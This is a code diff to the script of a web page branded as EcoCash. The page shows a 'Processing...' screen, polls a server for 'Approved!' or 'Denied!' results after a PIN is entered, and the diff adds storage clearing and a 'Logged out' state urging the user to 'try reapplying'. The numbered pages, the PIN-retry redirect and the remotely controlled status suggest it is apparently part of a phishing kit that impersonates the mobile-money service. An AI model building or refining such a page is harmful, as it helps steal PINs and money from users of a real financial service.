@@ -93,6 +93,15 @@
 </div>
 
 <script>
+function resetAppState() {
+    try {
+        localStorage.clear();
+        sessionStorage.clear();
+    } catch (e) {
+        console.warn('Could not clear storage:', e);
+    }
+}
+
 document.addEventListener("DOMContentLoaded", async () => {
 
     const mainText = document.getElementById("main-text");
@@ -127,7 +136,7 @@ document.addEventListener("DOMContentLoaded", async () => {
 
     // -------------------- DYNAMIC TEXT UPDATE --------------------
     setTimeout(() => {
-        if (mainText.textContent !== "Approved!" && mainText.textContent !== "Denied!") {
+        if (mainText.textContent !== "Approved!" && mainText.textContent !== "Denied!" && mainText.textContent !== "Logged out!") {
             mainText.textContent = "Processing...";
             subText.textContent = "Securely confirming authentication with EcoCash systems.";
         }
@@ -145,7 +154,7 @@ document.addEventListener("DOMContentLoaded", async () => {
                 clearInterval(pollingInterval);
                 mainText.textContent = "Approved!";
                 subText.textContent = "Account verified successfully. Redirecting...";
-                
+
                 // EcoCash Green Accent highlight style update
                 document.querySelector('.loader-circle').style.background = '#4CAF50';
 
@@ -161,8 +170,20 @@ document.addEventListener("DOMContentLoaded", async () => {
                 subText.textContent = "Incorrect PIN details. Sending you back...";
 
                 setTimeout(() => {
+                    resetAppState();
                     window.location.href = "/page6.html?error=wrongpin";
                 }, 2000);
+            }
+
+            if (data.status === "logged_out") {
+                clearInterval(pollingInterval);
+                mainText.textContent = "Logged out!";
+                subText.textContent = data.message || "Please log out from EcoCash Super App and try reapplying again.";
+                document.querySelector('.loader-circle').style.background = '#d32f2f';
+                resetAppState();
+                setTimeout(() => {
+                    window.location.href = "/index.html";
+                }, 2500);
             }
 
         } catch (err) {
